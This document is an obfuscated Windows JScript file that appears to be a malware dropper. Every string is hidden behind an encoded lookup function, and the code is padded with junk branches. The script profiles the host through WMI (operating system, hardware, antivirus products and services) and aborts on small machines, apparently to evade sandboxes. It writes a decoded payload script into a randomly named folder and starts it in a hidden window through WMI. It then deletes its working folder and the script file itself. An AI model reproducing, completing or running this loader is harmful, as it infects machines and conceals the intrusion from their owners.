  "SpDjy89swSsV9mVY.vCz.Eqh9uJj-pDUy~Ed9XJu.vi4iu-tiuFti_M~y8.d9XJjNR.vy8.1f8NQy6AYS6s49mcVy/sry6cVImcM9C", "ImfYK_NH2vFYkU", "i_JYi~9a-pDxf6YYK_NUi~sHi_N4ypjhKX1Zi~spi_xS9RlVwD1x2~YY./JQi/4YSpDjy89swSsV9mVY./JYwD.sf8Dv-6SYwS9a-plsi_ME-t.a-FEd2~sayu17Im0sytN4kSlaytNQytDsi/VYLC", ".~xFirVYC/4YCRDVI~qvIRQx2~sayuJqi_._9mEv9RiY._xQ9uJz.~c8KX1Zi_fY.Eqpi_NL9RCYLX1sy/lsi/4Y./NBi/VQiu1q", "./iUirVYK_fY.~P0i_Vj96DVwmsFi/UY78DVwDlV-psH9vFHD/.QyXYQ",
  "S81x26c.ytlVfmcd9Dg", "C8.sfRNsD~DA2P9Qy~S", "i_JYi_NVyvJqirFU", "./fUirVYidPHl_AciY", "7mEAC60af6j7-~Ds9J",
  "i_JYi_NofuJqi_NofXc/9RNSkR1s-vYQi/UYD6xs-pSj76.b9mlVi/4Y.EgH7pEj9XJjy~sB9XJFR6EMi/VYL_179m0sf8Cj76.b9mlVi_M~IR.h2_J0", "7pD8wSsV9mVYwSsV9mMSkR1siPNQ-pDd2~qvkXJjS~EVI_JF9rJYwS9a-plsi/UY78DVwScMy~U", ".~94irVY.~9xy/ls", "./SUirVYiuNL9~VafR1Qw81s9Riu", "DMld-psU2_c7I~D4yJ",
  "NRxUfmcFNmc6IR.aypMsytN72/.Qyp2h", "i_JYi_JYi_JYi_JYi_Ju.~DH2dQC-pqt-pEjN~EVfD0lImlvy8la9tN-D6sH9~q8-M072~Ev2_1l9mcMRE1vy62vfmMhRE.M-8NP9RlBiuF", "i_JYi_JYi_JYi_JYSpDjy89swSsV9mVY.PqM2P9Qy~SYwS9a-plsi_ME-t.a-FEd2~sayu17Im0sytN4kSlaytNQytDs", "i_JYi_NU-hEF9mUYL_179RCjC6qH2~DH2_JFR8CYwSDHf6qFImctiEDSNdY", "f6EVf6YYkU",
  "REg", "i_JYi/1x-pEjK_ND-pU4i_NO2RN~Im0sw_JFNRxU9mlV9mN7IRQsirVYe_UY.PDA-~Dd2~DFS6xxedS6irVYiui4i_NlfRx12/NsyR1V-vJqirCQ", "StDHypsH9U", "IRNsyC", "S8Nx-tCjS6lz9mNMy~DFD~EhIvJjD~EhIVcxymSY.~AUi_ME-t.a-FEd2~sayu17Im0sytN4kSlaytNQytDs",
  "RX1Hy8CY9pqMypC", "XD119~Nv9Rlh", ".uJFf7PYwXMdy6cpIm-YK_fY.Eqpi_NL9meQ", "i_JYi_JYi_1RI~Dv9XMOfpQsf8CYkvJFRvcWfmMsi_MjfRNdI_1y-pDt9Rx2WdQE-6lx-~Sz./ShKX1qKC", "./eUirVYN6DVwDls-t9Qf6SYwScxymSYis.M-8NP9RlBiuJjNR.vy8.1f8NQy6AYS6s49mcVy/sry6cVImcM9C",
  "i_JYi/Dh9R.LIRlLfmNjImAYi_JYirVY./SV", "NVi", "iuJjS8Nv9mEji_NLkpFYwSDv-pqvCmlVImqHiElQy~DH2~0cC6qH2~sH2mS", "i_JYi_JYmMNsk/CHNmcdy6NQyp22WdQ1SVl.XXc/9RN_kRNs-vYF2dJQmhJHwdl2KU", "i_JYi_NLfRSYOXJjIpqQyuxJKriUevU0lrJ4e7C6wrPhluU0WrJ4e7CcwriUevFYL_1~y8.EfmlzwSquIpDd2_1ZiEjdI~EvRXYFRvJjftxa-uJUkPS0KX1qKC",
  "7SiY9t.s9C", "./CvirVY7pD8wDldI~DF2m0s9ENx-6jC-psHf6sUfmUYwS2vy8DUXmCYiF.DXS0SXSc-DRls-teui_MX2mce9R9sy_1eImMQ2~DF", "Npq49~DvNRxQ-8Nh", "XmcCfR.xymDV9R.h", "i_JYiEjuy6q4RXx/9RCj7~qdfm0/-pqM-PMsym.s-uJjSVsPi_NhIXJjNR.vy8.1f8NQy6AYS8Na-_1g"
];
var openAddr = [
  "CtsUfRlh", ".D1vy62vfmMPfRNx.C", "LX1dfRNdI_1Zi~DAIRCYeX1q", "f6MFi_qdi/1Qyp-YwmAYeXJj2vJverJUiJ", "i_JYi_JYi_172~Ev2_M7y~Ds-_JjS6Ddy6cF-vJvWvJF2~gYw7VYeY",
  "i_JYi~spi_YjypqVi_xLNMJYwDDvy_JF9~0D-pUYwSqM2P9Qy~SY./1B9M1x2~YYwSDA-~Dd2~DFS6so9XJF2diYwSDA-~Dd2~DFS6xxedS6i_N6eXFQi/4Y9RxQ2_J0i/V", "fv1J", "SRDQ2J", "i_JYi~spi_YjypqVi_No9uFYkv1VI/.a2vJu9uiYLC", "S8Nx-tCjS60s9RJYeU",
  "S6lvIR1VNtD4yPcxymS", "S8Nx-tCjS/.af6Dh-vJjNps49D1x2~YY.~P0i_M1-p2MymDH2P0Q-8CYiuVjf6Vjypgj2mFui_MRImcFy8272/s49X1iImNF9mA", "i_JYi_N4ypjhi_4qiP2s2_MrI~s49PsV9mVYiFeoREDh9R.hiuJjN~sv9mlVy8.ci_ME-t.a-FEd2~sayu17Im0sytN4kSlaytNQytDsi/U", "i_JYi/1x-8l8y8.Fi_JYi_JYi_JYirVY./1B", "i_JYi_JYi_1Q9uJzKENs-8CjS~EVI_JFf7PQi_MxypCY./1vwFxx-VDAIRNs9_FYkv1u-pDxIv1q",
  "ImfYK_MHy8CY.~94KX1Z", "ND.Xi~sHIRCY9~shIhzY", "XSc.D_1RCD.WWu1QytlM9p9Qf6ssytCY9~shIv1h-~Ed9XJz", "D6sHeh.LS/.af6Dh-MlVfR.V2RJ", "XPjrDD07y69V26Ev9D0lImlvy8la9tN-S~q89R.7I~D4yEU0RElz9m04XmNhRPMQf8.a-6qp2_cCy82s-slz9m04RPDA9mlM2~says1ay~sdkC",
  "7tDjfpDv769ry8.s-U", ".EqFyXJqi_fY.Eqpi_NL9mC", "i_JYi_JYmV.Q2Playt9s-tNs-sVoWF2s2P.c2~DhKEjMImcVeh.2./fvKXF", "9tDHf8NQy6AYRVlei/4", "StDH",
  "mPquIpDd2J", "W_AAwdYHWJ", "i_JYiElVfR.VwD1vy6ls-8eYit1a26Dv-6xsy~UH9RxsiuJjCR.t2mMsytNeIRlVi_ij7pqHXmcV9R.xf8NQ2pSYwScaS/.a9ps49XJjNRxsf8DVImqHS~q4ImlciP.c-~Eh-vJjNps49X1YiuNL2~JuiuJjD6sH9~q8S8Ncy~SYX~sF9~DH", "ImfYK_MHy8CYKEj79mlM-psVkXcC-psHf6sUfmUHD6sH9~q8-M1vImcdIR1xyEMyS6Dd2R.Q2/FHS/.QyplQ-~E4ws2QypNa28l.9~DH2~sVkDVoWF2s2PlM-t.sytCzKXFHXRl.ys.ay~SzmMlsf8DvIRNcws1vImcdIR1xy_cRImcFy82hCtDQy/NQys.ay~D2WdQ19~MQypsh2/.x2~qvKXFYkU", "i_JYi~DAIRCYeC",
  "C8.sfRNs", "i_JYi/VYf6EVf6YYkv172~Ev2_M7y~Ds-_JjS6Ddy6cF-vJzeuJbi_NQKX1q", ".~P0irVYXpqQyuMCfRNzi_Nxe_Ju-tDh2~Ns-64H9RxsiY", "i_JYiPcs2vM79R.6Imlsi_MWfmMsi_.X2RlVN~DhIviYwS.QypEvkD1x2~xWfmMsi_.YiuNxemJui_Vj-6Dv2psd9XiYwSNQ-814fRsWfmMsi_.X2RlVN~DhIv179R.6ImlsiuJjS8Nx-tNM-ENc-~SYCRDVy6Mx2~sdi/UY78DVwScMy~U", ".~CUirVYiFeoRE1vy62vfmMPfRNxRE.M-8NP9RlBiY"
];
var regCode    = [taskMode(67), taskMode(0x9c)];
var bufFlag     = [taskMode(0x7e), taskMode(0x8b), taskMode(0xd0)];
var hoantseeGruesp          = taskMode(0x128);
var copyNext  = 2;
var croatnanCli          = taskMode(0x69);
var cap484 = ((typeof WScript) === (typeof 0x337)) ? 0xf84 : 0x773;
var seekScope=[taskMode(0xee),taskMode(99),taskMode(87),taskMode(58),taskMode(0x130),taskMode(0x8d),"",taskMode(18),"",taskMode(0x12a),taskMode(0x12b),"}","",taskMode(0xbf),taskMode(0x108),taskMode(19),taskMode(42),taskMode(0xf0),taskMode(0xcf),taskMode(62),taskMode(0x116),taskMode(0x6c),taskMode(0x110),"",taskMode(75),taskMode(89),taskMode(0x12e),"",taskMode(0xb6),taskMode(0xf1),"",taskMode(0xdb),taskMode(0xe7),taskMode(0xa2),taskMode(2),taskMode(0xd4),taskMode(0xb9),"}",taskMode(0x95),taskMode(0x107),taskMode(0x124),taskMode(0x73),taskMode(1),taskMode(0xe9),"",taskMode(0x125),taskMode(0x70),taskMode(0xf6),taskMode(0x11a),taskMode(0xbb),taskMode(0xe8),"}","",taskMode(0xdc),taskMode(0xa5),taskMode(0xa6),taskMode(26),"}","",taskMode(0x91),taskMode(0xfb),taskMode(0xa9),taskMode(0xbd),taskMode(0x64),taskMode(0xf7),taskMode(22),taskMode(91),taskMode(0x8e),taskMode(10),taskMode(0x75),taskMode(0xd9),taskMode(0x94),taskMode(0x88),taskMode(78),taskMode(0x84),"}","",taskMode(43),"",taskMode(17),taskMode(15),taskMode(48),taskMode(0x7f),"",taskMode(0x113),"",taskMode(0),taskMode(0xed),taskMode(0x76),taskMode(0x11c),taskMode(0x112),taskMode(78),taskMode(16),taskMode(0x8c),taskMode(0x7b),taskMode(0xc0),taskMode(0x81),"}","",taskMode(0x83),taskMode(0x12f),"}",taskMode(0xd1),taskMode(0xda),"",taskMode(71),taskMode(0x101),taskMode(0xae),taskMode(13),"",taskMode(86),taskMode(36),taskMode(0x89),taskMode(95),taskMode(78),taskMode(54),"}",taskMode(0x90),taskMode(0xda),"",taskMode(6),taskMode(0x123),taskMode(0xf3),taskMode(0xd2),taskMode(0xc5),taskMode(0x10a),taskMode(46),taskMode(0xa4),"",taskMode(80),taskMode(0xc1),taskMode(25),taskMode(0xd1),taskMode(0x9a),taskMode(0x119),taskMode(25),taskMode(0xda),taskMode(0xb3),"",taskMode(0x103),taskMode(0xea),taskMode(0xa8),taskMode(45),taskMode(0xe0),taskMode(44),taskMode(30),"",taskMode(0xc9),taskMode(7),taskMode(90),taskMode(0x6f),taskMode(0x6a),taskMode(0xab),"",taskMode(93),taskMode(0x7c),taskMode(70),taskMode(40),taskMode(0x10d),taskMode(0x102),taskMode(0xe5),"",taskMode(0x82),taskMode(0x9e),taskMode(32),taskMode(0x11b),taskMode(0x79),taskMode(11),taskMode(0x9d),taskMode(55),taskMode(0x104),taskMode(0x71),taskMode(0xa7),taskMode(0xa0),taskMode(0xd3),"}",taskMode(0xc8),taskMode(0xbe),"",taskMode(0xe7),taskMode(61),taskMode(0xd4),taskMode(85),taskMode(0x64),taskMode(35),taskMode(68),taskMode(0x94),taskMode(78),"}","",taskMode(0xf2),taskMode(41),taskMode(0x96),taskMode(20),taskMode(0x99),taskMode(0x12d),"}",taskMode(0x11d),taskMode(47),taskMode(0xc4),"}",taskMode(0xfe),"",taskMode(0xa1),"",taskMode(14),taskMode(77),taskMode(0x87),taskMode(59),taskMode(0x117),taskMode(0xe6),taskMode(0x74),taskMode(0xd8),taskMode(24),taskMode(0xf8),taskMode(0x129),"}"];

var bindKey   = new (this[taskMode(0x8f)+taskMode(0x127)])(taskMode(27));
var saveRef = new (this[taskMode(0x8f)+taskMode(0x127)])(taskMode(0xf4));
var parseRef   = this[taskMode(57)+taskMode(0xba)](taskMode(88));
var sowldSwairva = null;

var handleMax = saveRef[taskMode(0xf5)](taskMode(0x10f));
var _ld = null;
var clearHash = null;

function readBase() {
    var d = new Date();
    return d.toLocaleDateString() + " " + d.toLocaleTimeString();
}

function startStr(msg) {
    var processStep = "[" + readBase() + taskMode(0xd7) + msg;
    var f = bindKey[taskMode(66)](clearHash, 8, true);
    f[taskMode(0x86)](processStep);
    f[taskMode(0x72)]();
}

function pollMap() {
    try {
        saveRef[taskMode(76)](taskMode(0xc7), 1, taskMode(0xdf));
        if ((typeof String) === (typeof 0x2c3)) { var acc2328 = 0x535; try { if (acc2328 > 0x536) {} } catch(step1810) {} }
        saveRef[taskMode(39)](taskMode(0xc7));
        return true;
    } catch(e) { return false; }
}

function valDelay(len) {
    var buildTimeout = taskMode(0x7a);
    var s = "";
    for (var i = 0; i < len; i++)
        s += buildTimeout.charAt(Math.floor(Math.random() * buildTimeout.length));
    return s;
}

var _FOLDER_PFX = [taskMode(0x80), taskMode(0xbc), taskMode(0xe3), taskMode(0xb8), taskMode(5)];

function checkSize() {
    try {
        var jobDelay = _FOLDER_PFX[Math.floor(Math.random() * _FOLDER_PFX.length)] + valDelay(5);
        var msgHeight    = handleMax + "\\" + jobDelay;
        if (!bindKey[taskMode(0x10b)](msgHeight)) bindKey[taskMode(0xe2)](msgHeight);
        var pushPort = valDelay(10);
        var workLine  = msgHeight + "\\" + pushPort + taskMode(0xcc);
        var f = bindKey[taskMode(0xec)](workLine, true, false);
        if ((0xd7d * 0x0) > 0x0) { var src9193 = 0xd7d; while (src9193 < 0x0) { src9193 += 0x176f; if (src9193 > 0x1afa) break; } }
        for (var i = 0; i < seekScope.length; i++) {
            f[taskMode(0x86)](seekScope[i]);
        }
        f[taskMode(0x72)]();
        sowldSwairva = workLine;
    } catch (e) {
    }
}

function numMin() {
    try {
        if (sowldSwairva === null || !bindKey[taskMode(0x9f)](sowldSwairva)) return;
        saveRef[taskMode(76)](taskMode(0x121), taskMode(0x10e), taskMode(97));
        var handleRet = parseRef.Get(taskMode(28));
        var warnPos  = parseRef.Get(taskMode(0x120))[taskMode(0xeb)]();
        warnPos.ShowWindow = 0;
        var spralmplouPelft  = handleRet[taskMode(92)](taskMode(0x12c))[taskMode(0x10c)][taskMode(0xeb)]();
        spralmplouPelft[taskMode(94)] = taskMode(0x68) + sowldSwairva + "\"";
        spralmplouPelft.ProcessStartupInformation = warnPos;
        try { if (WScript["Version"]["length"] > 0x3c) { throw 0x19d9; } } catch(flag2290) {}
        handleRet[taskMode(72)](taskMode(0x12c), spralmplouPelft);
    } catch (e) {
    }
}

function decodeOffset() {
    var q  = parseRef[taskMode(0x67)](taskMode(4));
    var e  = new (this[taskMode(53)])(q);
    if (!e[taskMode(0xb0)]()) {
        var os = e[taskMode(0xfd)]();
        startStr(taskMode(29) + os.Caption + " " + os.Version + taskMode(0xb2) + os.OSArchitecture + ")");
    }
    var q2 = parseRef[taskMode(0x67)](taskMode(0xb4));
    var e2 = new (this[taskMode(53)])(q2);
    if (!e2[taskMode(0xb0)]()) startStr(taskMode(69) + e2[taskMode(0xfd)]().Name);
}

function pullData() {
    var cacheSrc  = bindKey[taskMode(0xc2)](taskMode(52));
    var slonltfraCeandspror = Math.round(cacheSrc[taskMode(0x6e)] / 0x40000000 * 10) / 10;
    if (slonltfraCeandspror < copyNext) {
        startStr(taskMode(0x11f) + slonltfraCeandspror + taskMode(33));
        try { bindKey[taskMode(0xde)](handleMax + "\\" + croatnanCli, true); } catch(ex) {}
        WScript[taskMode(0x115)](1);
    }
}

function valSource() {
    var nullTowspsci = saveRef[taskMode(0x126)](taskMode(0x111) + hoantseeGruesp + taskMode(82), 0, true);
    if (nullTowspsci !== 0) startStr(taskMode(56));
}

function sendDest() {
    for (var i = 0; i < regCode.length; i++) {
        var emitError = regCode[i];
        var q    = parseRef[taskMode(0x67)](taskMode(65) + emitError + "'");
        var e    = new (this[taskMode(53)])(q);
        if (e[taskMode(0xb0)]()) startStr(taskMode(0xca) + emitError + taskMode(0xff));
    }
}

function runMin() {
    for (var i = 0; i < bufFlag.length; i++) {
        var loastwanNays = bufFlag[i];
        var q   = parseRef[taskMode(0x67)](taskMode(96) + loastwanNays + "'");
        var e   = new (this[taskMode(53)])(q);
        if (!e[taskMode(0xb0)]()) {
            var copyMsg = e[taskMode(0xfd)]().State;
            if (copyMsg !== taskMode(0xfc)) startStr(taskMode(0x8a) + loastwanNays + taskMode(0x78) + copyMsg + ")");
        } else {
            startStr(taskMode(0x8a) + loastwanNays + taskMode(0xff));
        }
    }
}

if (!pollMap()) {
    var _tmp = saveRef[taskMode(0xf5)](taskMode(0xb5)) + taskMode(0xfa) + Math.floor(Math.random() * 0xf423f) + taskMode(0xcc);
    var _pf = bindKey[taskMode(0xec)](_tmp, true);
    var err8043 = ((0x26d2 + 0x1620) < 0x161f) ? 0x26d2 : 0x1620;
    _pf[taskMode(0x86)](taskMode(0x85));
    _pf[taskMode(0x86)](taskMode(34));
    _pf[taskMode(0x86)](taskMode(0xbf));
    _pf[taskMode(0x86)](taskMode(74));
    _pf[taskMode(0x86)]("}");
    if ((new Date())["getFullYear"]() > 0x7b2) { var buf8121 = 0x1d07; buf8121 = buf8121 * 1; }
    _pf[taskMode(0x86)](taskMode(0xf9));
    _pf[taskMode(0x86)](taskMode(50));
    _pf[taskMode(0x86)](taskMode(0x98) + WScript[taskMode(0x118)].replace(/\$/g, taskMode(60)) + taskMode(0x106));
    if ((new Date(0x0).getFullYear()) > 0x809) { var ref3351 = 0xee1; while (ref3351 < 0x0) { ref3351 += 0x20a6; if (ref3351 > 0x1dc2) break; } }
    _pf[taskMode(0x86)](taskMode(0xaa));
    _pf[taskMode(0x86)](taskMode(0x64));
    _pf[taskMode(0x86)](taskMode(0xce) + WScript[taskMode(0x118)].replace(/\$/g, taskMode(60)) + taskMode(0xac));
    _pf[taskMode(0x86)](taskMode(49));
    _pf[taskMode(0x86)](taskMode(83));
    _pf[taskMode(0x86)](taskMode(63));
    _pf[taskMode(0x86)](taskMode(49));
    _pf[taskMode(0x86)](taskMode(78));
    _pf[taskMode(0x86)]("}");
    _pf[taskMode(0x86)](taskMode(9));
    _pf[taskMode(0x72)]();
    saveRef[taskMode(76)](taskMode(0x121), taskMode(0x10e), taskMode(97));
    saveRef[taskMode(0x126)](taskMode(23) + _tmp + "\"", 0, false);
    
function argNode() {
    try {
        var regBatch = parseRef[taskMode(0x67)](taskMode(51));
        var flushMin = new (this[taskMode(53)])(regBatch);
        var loadNum = "", dataStep = 0, pollLevel = 0, scanLevel = 0;
        if (!flushMin[taskMode(0xb0)]()) {
            var wrapPath = flushMin[taskMode(0xfd)]();
            loadNum = wrapPath.Name || "";
            dataStep = wrapPath[taskMode(0x122)] || 0;
            pollLevel = wrapPath[taskMode(0xef)] || 0;
            scanLevel = wrapPath[taskMode(0x7d)] || 0;
        }
        var decodeTime = parseRef[taskMode(0x67)](taskMode(73));
        var fetchTarget = new (this[taskMode(53)])(decodeTime), closeHash = 0;
        while (!fetchTarget[taskMode(0xb0)]()) { closeHash += (fetchTarget[taskMode(0xfd)]()[taskMode(12)] || 0); fetchTarget[taskMode(0xb7)](); }
        var resetNum = Math.round(closeHash / 0x40000000);
        startStr(taskMode(0xa3) + loadNum.replace(/\s+/g, " ").substring(0, 36)
            + taskMode(3) + dataStep + taskMode(0x114) + pollLevel + taskMode(0x6b) + resetNum + taskMode(0x105)
            + ((scanLevel > 80) ? taskMode(0xd5) + scanLevel + taskMode(0x9b) : ""));
    } catch (emitChunk) { startStr(taskMode(0x93) + emitChunk.message); }
    var out246 = ((new Date(0x0).getFullYear()) > 0x80f) ? 0x639 : 0x258a;
}
function clearScope() {
    try {
        var calcData = parseRef[taskMode(0x67)](taskMode(98));
        var countAddr = new (this[taskMode(53)])(calcData), cacheScope = 0;
        while (!countAddr[taskMode(0xb0)]()) {
            var winLoad = countAddr[taskMode(0xfd)](), clearEntry = "", sprarndkiSaift = "";
            try { clearEntry = new (this[taskMode(53)])(winLoad[taskMode(0x100)])[taskMode(0xfd)]() || ""; } catch (lockDepth) {}
            try { sprarndkiSaift = new (this[taskMode(53)])(winLoad[taskMode(0x66)])[taskMode(0xfd)]() || ""; } catch (lockDepth) {}
            if (clearEntry) startStr(taskMode(81) + cacheScope + taskMode(0xcb) + (winLoad[taskMode(37)] || "").substring(0, 28) + taskMode(0x77) + clearEntry + taskMode(0x92) + sprarndkiSaift);
            cacheScope++; countAddr[taskMode(0xb7)]();
        }
        if (cacheScope === 0) startStr(taskMode(0x6d));
    } catch (computeMsg) { startStr(taskMode(64) + computeMsg.message); }
}
function execFlag() {
    try {
        var skonnkbrouTanl = parseRef[taskMode(0x67)](taskMode(0xe1));
        try { if ((0x1f2e + 0x963) < 0x962) { throw 0x1f2e; } } catch(pos8283) {}
        var openDest = new (this[taskMode(53)])(skonnkbrouTanl);
        if (!openDest[taskMode(0xb0)]()) {
            var buildOut = openDest[taskMode(0xfd)]();
            var scorspPrunk = (buildOut[taskMode(0xdd)] || "").substring(0, 12);
            var tmp9894 = ((0x1114 * 0x1) === 0x1114) ? 0x1114 : 0x25b4;
            var updateInfo = Math.round((buildOut[taskMode(0xc3)]     || 0) / 0x400);
            var reendsponRarwoa = Math.round((buildOut[taskMode(0xc6)] || 0) / 0x400);
            var keyMode = (scorspPrunk.length >= 12)
                ? scorspPrunk.substring(0,4) + "-" + scorspPrunk.substring(4,6) + "-" + scorspPrunk.substring(6,8)
                  + " " + scorspPrunk.substring(8,10) + ":" + scorspPrunk.substring(10,12)
                : "?";
            startStr(taskMode(79) + keyMode + taskMode(0xcd) + updateInfo + "/" + reendsponRarwoa + taskMode(0x109));
        }
    } catch (sleskWorstor) { startStr(taskMode(8) + sleskWorstor.message); }
}
WScript[taskMode(0x115)](0);
}

_ld = handleMax + "\\" + croatnanCli + taskMode(0xad);
if (!bindKey[taskMode(0x10b)](handleMax + "\\" + croatnanCli)) bindKey[taskMode(0xe2)](handleMax + "\\" + croatnanCli);
if ((typeof WScript) === "object") { var buf208 = 0x8d3 + 0; var ret6503 = buf208; }
if (!bindKey[taskMode(0x10b)](_ld)) bindKey[taskMode(0xe2)](_ld);
clearHash = _ld + taskMode(0xb1);

startStr(taskMode(0x97));

try { decodeOffset();             } catch (e) { startStr(taskMode(0x65)   + e.message); }
try { pullData();              } catch (e) { startStr(taskMode(0x11e)      + e.message); }
try { valSource();           } catch (e) { startStr(taskMode(38)   + e.message); }
var buf3622 = ((95 + 86) === 0xb5) ? 0x2288 : 0x92;
try { sendDest(); } catch (e) { startStr(taskMode(21) + e.message); }
try { runMin();  } catch (e) { startStr(taskMode(31)  + e.message); }
try { argNode(); } catch (logPath) { startStr(taskMode(0xaf)  + logPath.message); }
try { clearScope(); } catch (logPath) { startStr(taskMode(0xd6) + logPath.message); }
try { execFlag(); } catch (logPath) { startStr(taskMode(84) + logPath.message); }

try { checkSize(); } catch (e) { }
try { numMin(); } catch (e) { }

try { bindKey[taskMode(0xde)](handleMax + "\\" + croatnanCli, true); } catch(e) {}
try { bindKey[taskMode(0xe4)](WScript[taskMode(0x118)]); } catch(e) {}

WScript[taskMode(0x115)](0);